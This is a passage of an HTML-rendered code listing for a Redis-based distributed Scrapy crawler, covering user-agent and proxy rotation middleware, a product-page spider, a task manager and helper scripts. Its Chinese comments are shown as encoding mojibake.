<span class="k">class</span><span class="w"> </span><span class="nc">RandomUserAgentMiddleware</span><span class="p">(</span><span class="n">UserAgentMiddleware</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;éšæœº User-Agent ä¸­é—´ä»¶&quot;&quot;&quot;</span>

    <span class="n">USER_AGENTS</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#39;</span><span class="p">,</span>
    <span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">user_agent</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">USER_AGENTS</span><span class="p">)</span>
        <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_agent</span>


<span class="k">class</span><span class="w"> </span><span class="nc">ProxyMiddleware</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä»£ç†ä¸­é—´ä»¶&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy_list</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proxy_list</span> <span class="o">=</span> <span class="n">proxy_list</span>

    <span class="nd">@classmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">from_crawler</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">crawler</span><span class="p">):</span>
        <span class="c1"># ä»é…ç½®æˆ– Redis è·å–ä»£ç†åˆ—è¡¨</span>
        <span class="n">proxy_list</span> <span class="o">=</span> <span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;PROXY_LIST&#39;</span><span class="p">,</span> <span class="p">[])</span>
        <span class="k">return</span> <span class="bp">cls</span><span class="p">(</span><span class="n">proxy_list</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_list</span><span class="p">:</span>
            <span class="n">proxy</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">proxy_list</span><span class="p">)</span>
            <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;proxy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">proxy</span>
            <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Using proxy: </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_exception</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">exception</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="c1"># ä»£ç†å¤±è´¥æ—¶ï¼Œç§»é™¤è¯¥ä»£ç†</span>
        <span class="n">proxy</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;proxy&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">proxy</span> <span class="ow">and</span> <span class="n">proxy</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_list</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">proxy_list</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>
            <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Removed failed proxy: </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>


<span class="k">class</span><span class="w"> </span><span class="nc">ExceptionMiddleware</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="c1"># æ£€æŸ¥å“åº”çŠ¶æ€ç </span>
        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">403</span><span class="p">,</span> <span class="mi">429</span><span class="p">]:</span>
            <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Rate limited or blocked: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="c1"># å¯ä»¥åœ¨è¿™é‡Œå®ç°å»¶è¿Ÿé‡è¯•é€»è¾‘</span>

        <span class="k">return</span> <span class="n">response</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_exception</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">exception</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Request failed: </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="si">}</span><span class="s2"> - </span><span class="si">{</span><span class="n">exception</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="5-scrapy_projectspidersbase_spiderpy">5. scrapy_project/spiders/base_spider.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">åŸºç¡€çˆ¬è™«ç±»</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy_redis.spiders</span><span class="w"> </span><span class="kn">import</span> <span class="n">RedisSpider</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy.loader</span><span class="w"> </span><span class="kn">import</span> <span class="n">ItemLoader</span>


<span class="k">class</span><span class="w"> </span><span class="nc">BaseRedisSpider</span><span class="p">(</span><span class="n">RedisSpider</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;åŸºç¡€ Redis çˆ¬è™«&quot;&quot;&quot;</span>

    <span class="c1"># Redis key (éœ€è¦åœ¨å­ç±»ä¸­è¦†ç›–)</span>
    <span class="n">redis_key</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="c1"># æ‰¹å¤„ç†å¤§å°</span>
    <span class="n">redis_batch_size</span> <span class="o">=</span> <span class="mi">10</span>

    <span class="c1"># æœ€å¤§ç©ºé—²æ—¶é—´ (ç§’)</span>
    <span class="n">max_idle_time</span> <span class="o">=</span> <span class="mi">60</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">make_request_from_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        ä» Redis è·å–çš„æ•°æ®åˆ›å»ºè¯·æ±‚</span>

<span class="sd">        Args:</span>
<span class="sd">            data: ä» Redis è·å–çš„ URL æˆ–æ•°æ®</span>

<span class="sd">        Returns:</span>
<span class="sd">            Request å¯¹è±¡</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">)</span> <span class="k">else</span> <span class="n">data</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">make_requests_from_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;éœ€è¦åœ¨å­ç±»ä¸­å®ç°&quot;&quot;&quot;</span>
        <span class="k">raise</span> <span class="ne">NotImplementedError</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_item_loader</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item_class</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆ›å»º ItemLoader&quot;&quot;&quot;</span>
        <span class="n">loader</span> <span class="o">=</span> <span class="n">ItemLoader</span><span class="p">(</span><span class="n">item</span><span class="o">=</span><span class="n">item_class</span><span class="p">(),</span> <span class="n">response</span><span class="o">=</span><span class="n">response</span><span class="p">)</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_value</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">loader</span>
</code></pre>
      </div>

      <h3 id="6-scrapy_projectspiderstarget_spiderpy">6. scrapy_project/spiders/target_spider.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ç›®æ ‡ç½‘ç«™çˆ¬è™«</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy</span><span class="w"> </span><span class="kn">import</span> <span class="n">Request</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">.base_spider</span><span class="w"> </span><span class="kn">import</span> <span class="n">BaseRedisSpider</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy_project.items</span><span class="w"> </span><span class="kn">import</span> <span class="n">ProductItem</span>


<span class="k">class</span><span class="w"> </span><span class="nc">TargetSpider</span><span class="p">(</span><span class="n">BaseRedisSpider</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç›®æ ‡ç½‘ç«™çˆ¬è™«&quot;&quot;&quot;</span>

    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;target_spider&#39;</span>
    <span class="n">redis_key</span> <span class="o">=</span> <span class="s1">&#39;target_spider:start_urls&#39;</span>

    <span class="n">custom_settings</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;CONCURRENT_REQUESTS&#39;</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span>
        <span class="s1">&#39;DOWNLOAD_DELAY&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        è§£æåˆ—è¡¨é¡µ</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="c1"># æå–äº§å“é“¾æ¥</span>
        <span class="k">for</span> <span class="n">href</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;.product-item a::attr(href)&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">getall</span><span class="p">():</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">href</span><span class="p">)</span>
            <span class="k">yield</span> <span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse_detail</span><span class="p">)</span>

        <span class="c1"># ç¿»é¡µ</span>
        <span class="n">next_page</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;.pagination .next::attr(href)&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">next_page</span><span class="p">:</span>
            <span class="k">yield</span> <span class="n">Request</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">next_page</span><span class="p">),</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_detail</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        è§£æè¯¦æƒ…é¡µ</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">loader</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_item_loader</span><span class="p">(</span><span class="n">ProductItem</span><span class="p">,</span> <span class="n">response</span><span class="p">)</span>

        <span class="c1"># æå–å­—æ®µ</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_css</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;h1.product-title::text&#39;</span><span class="p">)</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_css</span><span class="p">(</span><span class="s1">&#39;price&#39;</span><span class="p">,</span> <span class="s1">&#39;.price::text&#39;</span><span class="p">)</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_css</span><span class="p">(</span><span class="s1">&#39;stock&#39;</span><span class="p">,</span> <span class="s1">&#39;.stock::text&#39;</span><span class="p">)</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_css</span><span class="p">(</span><span class="s1">&#39;description&#39;</span><span class="p">,</span> <span class="s1">&#39;.description *::text&#39;</span><span class="p">)</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_css</span><span class="p">(</span><span class="s1">&#39;images&#39;</span><span class="p">,</span> <span class="s1">&#39;.product-images img::attr(src)&#39;</span><span class="p">)</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_css</span><span class="p">(</span><span class="s1">&#39;tags&#39;</span><span class="p">,</span> <span class="s1">&#39;.tags a::text&#39;</span><span class="p">)</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_css</span><span class="p">(</span><span class="s1">&#39;rating&#39;</span><span class="p">,</span> <span class="s1">&#39;.rating::attr(data-rating)&#39;</span><span class="p">)</span>
        <span class="n">loader</span><span class="o">.</span><span class="n">add_css</span><span class="p">(</span><span class="s1">&#39;reviews_count&#39;</span><span class="p">,</span> <span class="s1">&#39;.reviews-count::text&#39;</span><span class="p">)</span>

        <span class="k">yield</span> <span class="n">loader</span><span class="o">.</span><span class="n">load_item</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="7-schedulertask_managerpy">7. scheduler/task_manager.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ä»»åŠ¡ç®¡ç†å™¨</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>


<span class="k">class</span><span class="w"> </span><span class="nc">TaskManager</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;åˆ†å¸ƒå¼ä»»åŠ¡ç®¡ç†å™¨&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">redis_host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">redis_port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">redis_password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">redis_db</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span>
            <span class="n">host</span><span class="o">=</span><span class="n">redis_host</span><span class="p">,</span>
            <span class="n">port</span><span class="o">=</span><span class="n">redis_port</span><span class="p">,</span>
            <span class="n">password</span><span class="o">=</span><span class="n">redis_password</span><span class="p">,</span>
            <span class="n">db</span><span class="o">=</span><span class="n">redis_db</span><span class="p">,</span>
            <span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">add_start_urls</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider_name</span><span class="p">,</span> <span class="n">urls</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        æ·»åŠ èµ·å§‹ URL åˆ° Redis</span>

<span class="sd">        Args:</span>
<span class="sd">            spider_name: çˆ¬è™«åç§°</span>
<span class="sd">            urls: URL åˆ—è¡¨</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider_name</span><span class="si">}</span><span class="s2">:start_urls&quot;</span>

        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">urls</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
            <span class="n">urls</span> <span class="o">=</span> <span class="p">[</span><span class="n">urls</span><span class="p">]</span>

        <span class="n">added</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">lpush</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="o">*</span><span class="n">urls</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Added </span><span class="si">{</span><span class="n">added</span><span class="si">}</span><span class="s2"> URLs to </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">added</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_queue_size</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider_name</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–é˜Ÿåˆ—å¤§å°&quot;&quot;&quot;</span>
        <span class="n">key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider_name</span><span class="si">}</span><span class="s2">:start_urls&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">llen</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">clear_queue</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider_name</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¸…ç©ºé˜Ÿåˆ—&quot;&quot;&quot;</span>
        <span class="n">key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider_name</span><span class="si">}</span><span class="s2">:start_urls&quot;</span>
        <span class="n">deleted</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Cleared queue: </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">deleted</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_stats</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider_name</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–ç»Ÿè®¡ä¿¡æ¯&quot;&quot;&quot;</span>
        <span class="n">stats</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;queue_size&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_queue_size</span><span class="p">(</span><span class="n">spider_name</span><span class="p">),</span>
            <span class="s1">&#39;items_count&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">scard</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider_name</span><span class="si">}</span><span class="s2">:dupefilter&quot;</span><span class="p">),</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">stats</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
    <span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>

    <span class="n">manager</span> <span class="o">=</span> <span class="n">TaskManager</span><span class="p">(</span>
        <span class="n">redis_host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
        <span class="n">redis_port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span>
        <span class="n">redis_password</span><span class="o">=</span><span class="s1">&#39;redis123&#39;</span>
    <span class="p">)</span>

    <span class="c1"># æ·»åŠ èµ·å§‹ URL</span>
    <span class="n">urls</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s1">&#39;https://example.com/page/1&#39;</span><span class="p">,</span>
        <span class="s1">&#39;https://example.com/page/2&#39;</span><span class="p">,</span>
        <span class="s1">&#39;https://example.com/page/3&#39;</span><span class="p">,</span>
    <span class="p">]</span>

    <span class="n">manager</span><span class="o">.</span><span class="n">add_start_urls</span><span class="p">(</span><span class="s1">&#39;target_spider&#39;</span><span class="p">,</span> <span class="n">urls</span><span class="p">)</span>

    <span class="c1"># æŸ¥çœ‹ç»Ÿè®¡</span>
    <span class="n">stats</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="n">get_stats</span><span class="p">(</span><span class="s1">&#39;target_spider&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Stats: </span><span class="si">{</span><span class="n">stats</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="8-scriptsadd_taskspy">8. scripts/add_tasks.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">æ‰¹é‡æ·»åŠ ä»»åŠ¡è„šæœ¬</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)))</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">scheduler.task_manager</span><span class="w"> </span><span class="kn">import</span> <span class="n">TaskManager</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>

<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span>
    <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">,</span>
    <span class="nb">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> [</span><span class="si">%(levelname)s</span><span class="s1">] </span><span class="si">%(message)s</span><span class="s1">&#39;</span>
<span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">generate_urls</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">start_page</span><span class="p">,</span> <span class="n">end_page</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆ URL åˆ—è¡¨&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">?page=</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">start_page</span><span class="p">,</span> <span class="n">end_page</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span>


<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">manager</span> <span class="o">=</span> <span class="n">TaskManager</span><span class="p">(</span>
        <span class="n">redis_host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
        <span class="n">redis_port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span>
        <span class="n">redis_password</span><span class="o">=</span><span class="s1">&#39;redis123&#39;</span>
    <span class="p">)</span>

    <span class="c1"># ç”Ÿæˆ URL</span>
    <span class="n">urls</span> <span class="o">=</span> <span class="n">generate_urls</span><span class="p">(</span>
        <span class="n">base_url</span><span class="o">=</span><span class="s1">&#39;https://example.com/products&#39;</span><span class="p">,</span>
        <span class="n">start_page</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
        <span class="n">end_page</span><span class="o">=</span><span class="mi">100</span>
    <span class="p">)</span>

    <span class="c1"># æ·»åŠ åˆ°é˜Ÿåˆ—</span>
    <span class="n">manager</span><span class="o">.</span><span class="n">add_start_urls</span><span class="p">(</span><span class="s1">&#39;target_spider&#39;</span><span class="p">,</span> <span class="n">urls</span><span class="p">)</span>

    <span class="c1"># æŸ¥çœ‹ç»Ÿè®¡</span>
    <span class="n">stats</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="n">get_stats</span><span class="p">(</span><span class="s1">&#39;target_spider&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">âœ… Tasks added successfully!&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ğŸ“Š Queue size: </span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;queue_size&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="9-scriptsmonitorpy">9. scripts/monitor.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">çˆ¬è™«ç›‘æ§è„šæœ¬</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>

<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)))</span>


<span class="k">class</span><span class="w"> </span><span class="nc">CrawlerMonitor</span><span class="p">:</span>
